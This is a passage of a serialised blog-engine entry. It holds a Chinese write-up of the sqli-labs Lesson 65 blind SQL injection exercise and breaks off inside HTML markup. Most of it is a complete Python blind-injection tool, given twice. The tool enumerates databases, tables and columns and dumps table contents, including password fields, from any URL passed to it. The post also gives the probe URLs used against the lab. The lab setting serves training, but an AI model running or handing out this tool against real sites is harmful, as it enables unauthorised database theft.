range(lenth):\n        payload = head + \\\n            \" and ascii(substr((select database()),%d,1))\" % (i + 1)\n        dbname += and_method(url, payload)\n        print('[-]当前猜解', dbname)\n    print('[*]', dbname)\n\n\ndef getdbnum(url):\n    num = 0\n    payload = head + \\\n        \" AND ORD(MID((SELECT IFNULL(CAST(COUNT(schema_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.SCHEMATA),%d,1))>%d--+\"\n    num = binary_search_db(url, payload)\n    print('[+]数据库数 [%d]' % num)\n    return num\n\n\ndef get_all_db_len(url, num):\n    thread = []\n    key = []\n    th = []\n    lenth = []\n    for i in range(num):\n        payload = head + \\\n            \" AND ORD(MID((SELECT IFNULL(CAST(LENGTH(schema_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.SCHEMATA limit i,1),%d,1))>%d--+\"\n        payload = re.sub(r'\\bi\\b', str(i), payload)\n        key.append(payload)\n\n    def run_thread(stri, i):\n        s = \"db\" + str(i) + \":\" + str(binary_search_db(url, stri))\n        # print(s)\n        th.append(s)\n\n    for i in range(num):\n        t = threading.Thread(target=run_thread,\n                             args=(key[i], i,))\n        thread.append(t)\n        thread[i].start()\n\n    for i in range(num):\n        thread[i].join()\n    th.sort()\n    for i in th:\n        i = re.sub(r'db\\d+\\:', '', i)\n        lenth.append(i)\n    return lenth\n\n# 取与法\n\n\ndef and_method(url, payload):\n    two = [1, 2, 4, 8, 16, 32, 64, 128]\n    s = 0\n    keys = []\n    thread = []\n    m = []\n\n    def run_thread(url, i, s):\n        html = requests.get(url, headers=headers).text\n        if feature in html:\n            s = s | two[i]\n            m.append(s)\n\n    for i in range(8):\n        newpayload = \"\"\n        newpayload = payload + \"%26\" + \"%d=%d--+\" % (two[i], two[i])\n        keys.append(newpayload)\n\n    for i in range(8):\n        t = threading.Thread(target=run_thread, args=(\n            getpayload(url, keys[i]), i, s,))\n        thread.append(t)\n\n    for t in thread:\n        t.start()\n    for t in thread:\n        t.join()\n\n    for i in m:\n        s = s | i\n    return chr(s)\n\ndef getdbname(url):\n    num = getdbnum(url)\n    lenth = get_all_db_len(url, num)\n    dbs = []\n\n    for i in range(int(len(lenth))):\n        dbname = \"\"\n        for j in range(1, int(lenth[i]) + 1):\n            payload = head + \" and ascii(substr((select schema_name from information_schema.schemata limit %d,1),%d,1))\" % (\n                i, j)\n            dbname += and_method(url, payload)\n            print('[-]当前猜解', dbname)\n        print(dbname)\n        dbs.append(dbname)\n    print('available databases [%s]' % num)\n    for db in dbs:\n        print('[*]', db)\n\n\ndef get_table_num(url, dbname):\n    num = 0\n    payload = head + \\\n        \" AND ORD(MID((SELECT IFNULL(CAST(COUNT(table_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='%s'),\" % dbname\n    payload += \"%d,1))>%d--+\"\n    # print(payload)\n    num = binary_search_db(url, payload)\n    print('[+]数据表数 [%d]' % num)\n    return num\n\n\ndef get_all_table_len(url, num, dbname):\n    thread = []\n    key = []\n    th = []\n    lenth = []\n    for i in range(num):\n        payload = head + \\\n            \" AND ORD(MID((SELECT IFNULL(CAST(LENGTH(table_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='%s' limit i,1),\" % dbname\n        payload += \"%d,1))>%d--+\"\n        payload = re.sub(r'\\bi\\b', str(i), payload)\n        key.append(payload)\n\n    def run_thread(stri, i):\n        s = \"db\" + str(i) + \":\" + str(binary_search_db(url, stri))\n        # print(s)\n        th.append(s)\n\n    for i in range(num):\n        t = threading.Thread(target=run_thread,\n                             args=(key[i], i,))\n        thread.append(t)\n        thread[i].start()\n\n    for i in range(num):\n        thread[i].join()\n    th.sort()\n    for i in th:\n        i = re.sub(r'db\\d+\\:', '', i)\n        lenth.append(i)\n    return lenth\n\n\ndef get_table_name(url, dbname):\n    num = get_table_num(url, dbname)\n    lenth = get_all_table_len(url, num, dbname)\n    tables = []\n\n    for i in range(int(len(lenth))):\n        tbname = \"\"\n        for j in range(1, int(lenth[i]) + 1):\n            payload = head + \\\n                \" and ascii(substr((select table_name from information_schema.tables WHERE TABLE_SCHEMA='%s' limit\" % dbname\n            payload += \" %d,1),%d,1))\" % (i, j)\n            tbname += and_method(url, payload)\n            print('[-]当前猜解', tbname)\n        print(tbname)\n        tables.append(tbname)\n    print('Database: %s' % dbname)\n    print('[%d tables]' % num)\n    for table in tables:\n        print('[*]', table)\n\n# 获取列数\n\n\ndef get_column_num(url, tbname, dbname):\n    num = 0\n    payload = head + \" AND ORD(MID((SELECT IFNULL(CAST(COUNT(column_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='%s' AND TABLE_SCHEMA='%s'),\" % (\n        tbname, dbname)\n    payload += \"%d,1))>%d--+\"\n    num = binary_search_db(url, payload)\n    print('[+]列数 [%d]' % num)\n    return num\n\n# 获取列长度\n\n\ndef get_all_columns_len(url, num, tbname, dbname):\n    thread = []\n    key = []\n    th = []\n    lenth = []\n    for i in range(num):\n        payload = head + \" AND ORD(MID((SELECT IFNULL(CAST(LENGTH(column_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='%s' AND TABLE_SCHEMA='%s' limit i,1),\" % (\n            tbname, dbname)\n        payload += \"%d,1))>%d--+\"\n        payload = re.sub(r'\\bi\\b', str(i), payload)\n        key.append(payload)\n\n    def run_thread(stri, i):\n        s = \"co\" + str(i) + \":\" + str(binary_search_db(url, stri))\n        # print(s)\n        th.append(s)\n\n    for i in range(num):\n        t = threading.Thread(target=run_thread,\n                             args=(key[i], i,))\n        thread.append(t)\n        thread[i].start()\n\n    for i in range(num):\n        thread[i].join()\n    th.sort()\n    for i in th:\n        i = re.sub(r'co\\d+\\:', '', i)\n        lenth.append(i)\n    return lenth\n\n# 获取列名\n\n\ndef get_column_name(url, tbname, dbname):\n    num = get_column_num(url, tbname, dbname)\n    lenth = get_all_columns_len(url, num, tbname, dbname)\n    columns = []\n\n    for i in range(int(len(lenth))):\n        coname = \"\"\n        for j in range(1, int(lenth[i]) + 1):\n            payload = head + \" and ascii(substr((select column_name from information_schema.columns where table_name='%s' and table_schema='%s' limit\" % (\n                tbname, dbname)\n            payload += \" %d,1),%d,1))\" % (i, j)\n            coname += and_method(url, payload)\n            print('[-]当前猜解', coname)\n        print(coname)\n        columns.append(coname)\n    print('Database: %s' % dbname)\n    print('Table: %s' % tbname)\n    print('[%d columns]' % num)\n    for column in columns:\n        print('[*]', column)\n    return columns\n\n# 获取字段数\n\n\ndef get_data_num(url, tbname, dbname):\n    num = 0\n    payload = head + \\\n        \" AND ORD(MID((SELECT IFNULL(CAST(COUNT(*) AS CHAR),0x20) FROM %s.%s),\" % (dbname, tbname)\n    payload += \" %d,1))>%d--+\"\n    num = binary_search_db(url, payload)\n    print('[+]字段数 [%d]' % num)\n    return num\n\n# 获取字段长度\n\n\ndef get_data_len(url, coname, tbname, dbname, i):\n    payload = head + \" AND ORD(MID((SELECT IFNULL(CAST(LENGTH(%s) AS CHAR),0x20) FROM %s.%s limit %d,1),\" % (\n        coname, dbname, tbname, i)\n    payload += \" %d,1))>%d--+\"\n    lenth = binary_search_db(url, payload)\n    print('[+]当前字段`%s`长度: %d' % (coname, lenth))\n    return lenth\n\n# 获取字段值\n\n\ndef get_data(url, coname, tbname, dbname, count):\n    lenth = get_data_len(url, coname, tbname, dbname, count)\n    data = \"\"\n    for i in range(lenth):\n        payload = head + \" and ascii(substr((select %s from %s.%s limit %d,1),%d,1))\" % (\n            coname, dbname, tbname, count, i + 1)\n        data += and_method(url, payload)\n        print('[-]当前猜解', data)\n    print(data)\n    return data\n\n\ndef dump(url, tbname, dbname, coname=None):\n    num = get_data_num(url, tbname, dbname)\n    if coname is None:\n        columns = get_column_name(url, tbname, dbname)\n    else:\n        columns = coname.split(\",\")\n    print(columns)\n    datas = []\n    for i in range(num):\n        for column in columns:\n            data = get_data(url, column, tbname, dbname, i)\n            datas.append(data)\n        datas.append('.')\n\n    res = [s.split() for s in ' '.join(datas).split('.') if s]\n\n    for i in res:\n        for j in i:\n            print('%-15s' % j, end='')\n        print(\"\\n\")\n\n\ndef main():\n    parser = OptionParser()\n    parser.add_option('-u', '--url', type='string', dest='url',\n                      help='Target URL (e.g. \"http://www.site.com/vuln.php?id=1\")')\n    parser.add_option('-D', type='string', dest='db',\n                      help='DBMS database to enumerate')\n    parser.add_option('-T', type='string', dest='tbl',\n                      help='DBMS database table(s) to enumerate')\n    parser.add_option('-C', type='string', dest='col',\n                      help='DBMS database table column(s) to enumerate, use like id,password')\n    parser.add_option('--current-db', action='store_true',\n                      dest='cudbs', help='Retrieve DBMS current database')\n    parser.add_option('--dbs', action='store_true',\n                      dest='dbs', help='Enumerate ALL database')\n    parser.add_option('--tables', action='store_true',\n                      dest='tables', help='Enumerate DBMS database tables')\n    parser.add_option('--columns', action='store_true',\n                      dest='columns', help='Enumerate DBMS database table columns')\n    parser.add_option('--dump', action='store_true',\n                      dest='dump', help='Dump DBMS database table entries')\n    parser.add_option('--dump-all', action='store_true',\n                      dest='all', help='Dump all DBMS databases tables entries')\n    (options, args) = parser.parse_args()\n\n    if options.url and options.dbs:\n        url = options.url\n        getdbname(url)\n    elif options.url and options.cudbs:\n        url = options.url\n        get_cu_db_name(url)\n    elif options.url and options.db and options.tables:\n        url = options.url\n        dbname = options.db\n        get_table_name(url, dbname)\n    elif (options.url and options.db and options.tbl and options.col and options.dump):\n        url = options.url\n        dbname = options.db\n        tbname = options.tbl\n        coname = options.col\n        dump(url, tbname, dbname, coname)\n    elif (options.url and options.db and options.tbl and options.all):\n        url = options.url\n        dbname = options.db\n        tbname = options.tbl\n        dump(url, tbname, dbname)\n    elif (options.url and options.db and options.tbl and options.columns):\n        url = options.url\n        dbname = options.db\n        tbname = options.tbl\n        get_column_name(url, tbname, dbname)\n    else:\n        parser.print_help()\n\n\nif __name__ == '__main__':\n    main()\n\n```\n\n","source":"_posts/sqli-labs-lession-65-GET-盲注-变化4-仅允许130次请求.md","raw":"---\ntitle: sqli-labs lession-65 GET-盲注-变化4-仅允许130次请求\ndate: 2018-11-29 14:05:45\ntags: [sqli-labs]\ncategories: sql注入\n---\n\n# sqli-labs lession-65 GET-盲注-变化4-仅允许130次请求\n\n---\n\n## 注入\n\n`http://10.60.17.35:8082/Less-65/?id=1\")+and+1=2%23`\n\n`http://10.60.17.35:8082/Less-65/?id=1\")+and+1=1%23`\n\n## 脚本\n\n![001](/img/sql/Lesson-65/001.png)\n\n![002](/img/sql/Lesson-65/002.png)\n\n![003](/img/sql/Lesson-65/003.png)\n\n![004](/img/sql/Lesson-65/004.png)\n\n```\n#python3\nimport requests\nimport re\nimport threading\nfrom optparse import OptionParser\n\nfeature = 'Your Login name'\nhead = '\")'\nheaders = {\n    'user-agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0'}\n\n\ndef getpayload(url, payload):\n    return url + payload\n\n\ndef binary_search_db(url, payload):\n    i = 1\n    s = \"\"\n    while 1:\n        count = 0\n        mid = 0\n        low = 47\n        high = 57\n        while low <= high:\n            mid = int((low + high) / 2)\n            newpayload = payload % (i, mid)\n            html = requests.get(getpayload(url, newpayload),\n                                headers=headers).text\n            if feature in html:\n                low = mid + 1\n                count += 1\n            else:\n                high = mid - 1\n        if count != 0:\n            s = s + chr(int((low + high + 1) / 2))\n            i = i + 1\n        else:\n            break\n    return int(s)\n\n# 获取当前数据库长度\n\n\ndef get_db_len(url):\n    payload = head + \\\n        \" AND ORD(MID((SELECT LENGTH(database())),%d,1))>%d--+\"\n    lenth = binary_search_db(url, payload)\n    print('[+]当前数据库长度: %d' % lenth)\n    return lenth\n\n# 获取当前数据库名\n\n\ndef get_cu_db_name(url):\n    lenth = get_db_len(url)\n    dbname = \"\"\n    for i in range(lenth):\n        payload = head + \\\n            \" and ascii(substr((select database()),%d,1))\" % (i + 1)\n        dbname += and_method(url, payload)\n        print('[-]当前猜解', dbname)\n    print('[*]', dbname)\n\n\ndef getdbnum(url):\n    num = 0\n    payload = head + \\\n        \" AND ORD(MID((SELECT IFNULL(CAST(COUNT(schema_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.SCHEMATA),%d,1))>%d--+\"\n    num = binary_search_db(url, payload)\n    print('[+]数据库数 [%d]' % num)\n    return num\n\n\ndef get_all_db_len(url, num):\n    thread = []\n    key = []\n    th = []\n    lenth = []\n    for i in range(num):\n        payload = head + \\\n            \" AND ORD(MID((SELECT IFNULL(CAST(LENGTH(schema_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.SCHEMATA limit i,1),%d,1))>%d--+\"\n        payload = re.sub(r'\\bi\\b', str(i), payload)\n        key.append(payload)\n\n    def run_thread(stri, i):\n        s = \"db\" + str(i) + \":\" + str(binary_search_db(url, stri))\n        # print(s)\n        th.append(s)\n\n    for i in range(num):\n        t = threading.Thread(target=run_thread,\n                             args=(key[i], i,))\n        thread.append(t)\n        thread[i].start()\n\n    for i in range(num):\n        thread[i].join()\n    th.sort()\n    for i in th:\n        i = re.sub(r'db\\d+\\:', '', i)\n        lenth.append(i)\n    return lenth\n\n# 取与法\n\n\ndef and_method(url, payload):\n    two = [1, 2, 4, 8, 16, 32, 64, 128]\n    s = 0\n    keys = []\n    thread = []\n    m = []\n\n    def run_thread(url, i, s):\n        html = requests.get(url, headers=headers).text\n        if feature in html:\n            s = s | two[i]\n            m.append(s)\n\n    for i in range(8):\n        newpayload = \"\"\n        newpayload = payload + \"%26\" + \"%d=%d--+\" % (two[i], two[i])\n        keys.append(newpayload)\n\n    for i in range(8):\n        t = threading.Thread(target=run_thread, args=(\n            getpayload(url, keys[i]), i, s,))\n        thread.append(t)\n\n    for t in thread:\n        t.start()\n    for t in thread:\n        t.join()\n\n    for i in m:\n        s = s | i\n    return chr(s)\n\ndef getdbname(url):\n    num = getdbnum(url)\n    lenth = get_all_db_len(url, num)\n    dbs = []\n\n    for i in range(int(len(lenth))):\n        dbname = \"\"\n        for j in range(1, int(lenth[i]) + 1):\n            payload = head + \" and ascii(substr((select schema_name from information_schema.schemata limit %d,1),%d,1))\" % (\n                i, j)\n            dbname += and_method(url, payload)\n            print('[-]当前猜解', dbname)\n        print(dbname)\n        dbs.append(dbname)\n    print('available databases [%s]' % num)\n    for db in dbs:\n        print('[*]', db)\n\n\ndef get_table_num(url, dbname):\n    num = 0\n    payload = head + \\\n        \" AND ORD(MID((SELECT IFNULL(CAST(COUNT(table_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='%s'),\" % dbname\n    payload += \"%d,1))>%d--+\"\n    # print(payload)\n    num = binary_search_db(url, payload)\n    print('[+]数据表数 [%d]' % num)\n    return num\n\n\ndef get_all_table_len(url, num, dbname):\n    thread = []\n    key = []\n    th = []\n    lenth = []\n    for i in range(num):\n        payload = head + \\\n            \" AND ORD(MID((SELECT IFNULL(CAST(LENGTH(table_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='%s' limit i,1),\" % dbname\n        payload += \"%d,1))>%d--+\"\n        payload = re.sub(r'\\bi\\b', str(i), payload)\n        key.append(payload)\n\n    def run_thread(stri, i):\n        s = \"db\" + str(i) + \":\" + str(binary_search_db(url, stri))\n        # print(s)\n        th.append(s)\n\n    for i in range(num):\n        t = threading.Thread(target=run_thread,\n                             args=(key[i], i,))\n        thread.append(t)\n        thread[i].start()\n\n    for i in range(num):\n        thread[i].join()\n    th.sort()\n    for i in th:\n        i = re.sub(r'db\\d+\\:', '', i)\n        lenth.append(i)\n    return lenth\n\n\ndef get_table_name(url, dbname):\n    num = get_table_num(url, dbname)\n    lenth = get_all_table_len(url, num, dbname)\n    tables = []\n\n    for i in range(int(len(lenth))):\n        tbname = \"\"\n        for j in range(1, int(lenth[i]) + 1):\n            payload = head + \\\n                \" and ascii(substr((select table_name from information_schema.tables WHERE TABLE_SCHEMA='%s' limit\" % dbname\n            payload += \" %d,1),%d,1))\" % (i, j)\n            tbname += and_method(url, payload)\n            print('[-]当前猜解', tbname)\n        print(tbname)\n        tables.append(tbname)\n    print('Database: %s' % dbname)\n    print('[%d tables]' % num)\n    for table in tables:\n        print('[*]', table)\n\n# 获取列数\n\n\ndef get_column_num(url, tbname, dbname):\n    num = 0\n    payload = head + \" AND ORD(MID((SELECT IFNULL(CAST(COUNT(column_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='%s' AND TABLE_SCHEMA='%s'),\" % (\n        tbname, dbname)\n    payload += \"%d,1))>%d--+\"\n    num = binary_search_db(url, payload)\n    print('[+]列数 [%d]' % num)\n    return num\n\n# 获取列长度\n\n\ndef get_all_columns_len(url, num, tbname, dbname):\n    thread = []\n    key = []\n    th = []\n    lenth = []\n    for i in range(num):\n        payload = head + \" AND ORD(MID((SELECT IFNULL(CAST(LENGTH(column_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='%s' AND TABLE_SCHEMA='%s' limit i,1),\" % (\n            tbname, dbname)\n        payload += \"%d,1))>%d--+\"\n        payload = re.sub(r'\\bi\\b', str(i), payload)\n        key.append(payload)\n\n    def run_thread(stri, i):\n        s = \"co\" + str(i) + \":\" + str(binary_search_db(url, stri))\n        # print(s)\n        th.append(s)\n\n    for i in range(num):\n        t = threading.Thread(target=run_thread,\n                             args=(key[i], i,))\n        thread.append(t)\n        thread[i].start()\n\n    for i in range(num):\n        thread[i].join()\n    th.sort()\n    for i in th:\n        i = re.sub(r'co\\d+\\:', '', i)\n        lenth.append(i)\n    return lenth\n\n# 获取列名\n\n\ndef get_column_name(url, tbname, dbname):\n    num = get_column_num(url, tbname, dbname)\n    lenth = get_all_columns_len(url, num, tbname, dbname)\n    columns = []\n\n    for i in range(int(len(lenth))):\n        coname = \"\"\n        for j in range(1, int(lenth[i]) + 1):\n            payload = head + \" and ascii(substr((select column_name from information_schema.columns where table_name='%s' and table_schema='%s' limit\" % (\n                tbname, dbname)\n            payload += \" %d,1),%d,1))\" % (i, j)\n            coname += and_method(url, payload)\n            print('[-]当前猜解', coname)\n        print(coname)\n        columns.append(coname)\n    print('Database: %s' % dbname)\n    print('Table: %s' % tbname)\n    print('[%d columns]' % num)\n    for column in columns:\n        print('[*]', column)\n    return columns\n\n# 获取字段数\n\n\ndef get_data_num(url, tbname, dbname):\n    num = 0\n    payload = head + \\\n        \" AND ORD(MID((SELECT IFNULL(CAST(COUNT(*) AS CHAR),0x20) FROM %s.%s),\" % (dbname, tbname)\n    payload += \" %d,1))>%d--+\"\n    num = binary_search_db(url, payload)\n    print('[+]字段数 [%d]' % num)\n    return num\n\n# 获取字段长度\n\n\ndef get_data_len(url, coname, tbname, dbname, i):\n    payload = head + \" AND ORD(MID((SELECT IFNULL(CAST(LENGTH(%s) AS CHAR),0x20) FROM %s.%s limit %d,1),\" % (\n        coname, dbname, tbname, i)\n    payload += \" %d,1))>%d--+\"\n    lenth = binary_search_db(url, payload)\n    print('[+]当前字段`%s`长度: %d' % (coname, lenth))\n    return lenth\n\n# 获取字段值\n\n\ndef get_data(url, coname, tbname, dbname, count):\n    lenth = get_data_len(url, coname, tbname, dbname, count)\n    data = \"\"\n    for i in range(lenth):\n        payload = head + \" and ascii(substr((select %s from %s.%s limit %d,1),%d,1))\" % (\n            coname, dbname, tbname, count, i + 1)\n        data += and_method(url, payload)\n        print('[-]当前猜解', data)\n    print(data)\n    return data\n\n\ndef dump(url, tbname, dbname, coname=None):\n    num = get_data_num(url, tbname, dbname)\n    if coname is None:\n        columns = get_column_name(url, tbname, dbname)\n    else:\n        columns = coname.split(\",\")\n    print(columns)\n    datas = []\n    for i in range(num):\n        for column in columns:\n            data = get_data(url, column, tbname, dbname, i)\n            datas.append(data)\n        datas.append('.')\n\n    res = [s.split() for s in ' '.join(datas).split('.') if s]\n\n    for i in res:\n        for j in i:\n            print('%-15s' % j, end='')\n        print(\"\\n\")\n\n\ndef main():\n    parser = OptionParser()\n    parser.add_option('-u', '--url', type='string', dest='url',\n                      help='Target URL (e.g. \"http://www.site.com/vuln.php?id=1\")')\n    parser.add_option('-D', type='string', dest='db',\n                      help='DBMS database to enumerate')\n    parser.add_option('-T', type='string', dest='tbl',\n                      help='DBMS database table(s) to enumerate')\n    parser.add_option('-C', type='string', dest='col',\n                      help='DBMS database table column(s) to enumerate, use like id,password')\n    parser.add_option('--current-db', action='store_true',\n                      dest='cudbs', help='Retrieve DBMS current database')\n    parser.add_option('--dbs', action='store_true',\n                      dest='dbs', help='Enumerate ALL database')\n    parser.add_option('--tables', action='store_true',\n                      dest='tables', help='Enumerate DBMS database tables')\n    parser.add_option('--columns', action='store_true',\n                      dest='columns', help='Enumerate DBMS database table columns')\n    parser.add_option('--dump', action='store_true',\n                      dest='dump', help='Dump DBMS database table entries')\n    parser.add_option('--dump-all', action='store_true',\n                      dest='all', help='Dump all DBMS databases tables entries')\n    (options, args) = parser.parse_args()\n\n    if options.url and options.dbs:\n        url = options.url\n        getdbname(url)\n    elif options.url and options.cudbs:\n        url = options.url\n        get_cu_db_name(url)\n    elif options.url and options.db and options.tables:\n        url = options.url\n        dbname = options.db\n        get_table_name(url, dbname)\n    elif (options.url and options.db and options.tbl and options.col and options.dump):\n        url = options.url\n        dbname = options.db\n        tbname = options.tbl\n        coname = options.col\n        dump(url, tbname, dbname, coname)\n    elif (options.url and options.db and options.tbl and options.all):\n        url = options.url\n        dbname = options.db\n        tbname = options.tbl\n        dump(url, tbname, dbname)\n    elif (options.url and options.db and options.tbl and options.columns):\n        url = options.url\n        dbname = options.db\n        tbname = options.tbl\n        get_column_name(url, tbname, dbname)\n    else:\n        parser.print_help()\n\n\nif __name__ == '__main__':\n    main()\n\n```\n\n","slug":"sqli-labs-lession-65-GET-盲注-变化4-仅允许130次请求","published":1,"updated":"2019-06-19T17:23:13.399Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjx3istkz00a14dsbqt9lxsmd","content":"<h1 id=\"sqli-labs-lession-65-GET-盲注-变化4-仅允许130次请求\"><a href=\"#sqli-labs-lession-65-GET-盲注-变化4-仅允许130次请求\" class=\"headerlink\" title=\"sqli-labs lession-65 GET-盲注-变化4-仅允许130次请求\"></a>sqli-labs lession-65 GET-盲注-变化4-仅允许130次请求</h1><hr>\n<h2 id=\"注入\"><a href=\"#注入\" class=\"headerlink\" title=\"注入\"></a>注入</h2><p><code>http://10.60.17.35:8082/Less-65/?id=1&quot;)+and+1=2%23</code></p>\n<p><code>http://10.60.17.35:8082/Less-65/?id=1&quot;)+and+1=1%23</code></p>\n<h2 id=\"脚本\"><a href=\"#脚本\" class=\"headerlink\" title=\"脚本\"></a>脚本</h2><p><img src=\"/img/sql/Lesson-65/001.png\" alt=\"001\"></p>\n<p><img src=\"/img/sql/Lesson-65/002.png\" alt=\"002\"></p>\n<p><img src=\"/img/sql/Lesson-65/003.png\" alt=\"003\"></p>\n<p><img src=\"/img/sql/Lesson-65/004.png\" alt=\"004\"></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br><span class=\"line\">205</span><br><span class=\"line\">206</span><br><span class=\"line\">207</span><br><span class=\"line\">208</span><br><span class=\"line\">209</span><br><span class=\"line\">210</span><br><span class=\"line\">211</span><br><span class=\"line\">212</span><br><span class=\"line\">213</span><br><span class=\"line\">214</span><br><span class=\"line\">215</span><br><span class=\"line\">216</span><br><span class=\"line\">217</span><br><span class=\"line\">218</span><br><span class=\"line\">219</span><br><span class=\"line\">220</span><br><span class=\"line\">221</span><br><span class=\"line\">222</span><br><span class=\"line\">223</span><br><span class=\"line\">224</span><br><span class=\"line\">225</span><br><span class=\"line\">226</span><br><span class=\"line\">227</span><br><span class=\"line\">228</span><br><span class=\"line\">229</span><br><span class=\"line\">230</span><br><span class=\"line\">231</span><br><span class=\"line\">232</span><br><span class=\"line\">233</span><br><span class=\"line\">234</span><br><span class=\"line\">235</span><br><span 